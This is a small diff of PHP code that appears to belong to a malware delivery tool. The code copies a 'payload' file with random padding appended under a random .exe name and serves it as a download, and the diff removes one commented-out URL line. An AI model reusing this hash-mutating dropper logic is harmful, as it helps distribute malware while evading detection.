@@ -88,7 +88,6 @@ class utils {
     $malFname = $utils->Alphanumeric(rand(5, 25));
 
     $utils->copyAppend('./' . $workingDir . '/' . $payload, $workingDir, rand(5, 512), $malFname, 'exe');
-    //$fileLocation = 'http://' . $svr . '/' . $workingDir  . '/' . $malFname . '.exe';
     $fileLocation = './' . $workingDir . '/' . $malFname . '.exe';
 
     header('Content-Type: application/octet-stream');
